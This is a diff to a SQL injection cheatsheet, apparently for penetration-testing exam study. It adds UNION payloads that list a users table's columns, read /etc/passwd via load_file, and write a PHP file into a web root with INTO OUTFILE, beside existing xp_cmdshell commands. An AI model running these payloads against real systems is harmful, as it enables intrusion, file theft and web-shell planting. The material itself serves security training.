@@ -19,6 +19,14 @@ For `UNION`, match the original column count and compatible types. Move output i
 ' UNION SELECT 1,@@version,3-- -
 ' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
 ' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
+```
+
+If the database account has `FILE` access and server configuration permits the path, a file read or `INTO OUTFILE` may be possible. Confirm the target path and web server handler first:
+
+```sql
+' UNION SELECT 1,load_file('/etc/passwd'),3-- -
+' UNION SELECT 1,'<?php echo "ok";?>',3 INTO OUTFILE '/var/www/html/check.php'-- -
 ```
 
 ## Blind checks
@@ -67,6 +75,6 @@ If both options were originally disabled, restore them when done. Otherwise, res
 '; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;-- -
 ```
 
-Automated SQL exploitation is outside this cheatsheet's exam workflow. See the current [OffSec exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) for tool restrictions.
+Keep one request and one response for each manual test so you can tell which change produced the result.
 
 SQL Server option behavior: [Microsoft `xp_cmdshell` configuration](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option) and [`sys.configurations`](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-configurations-transact-sql).
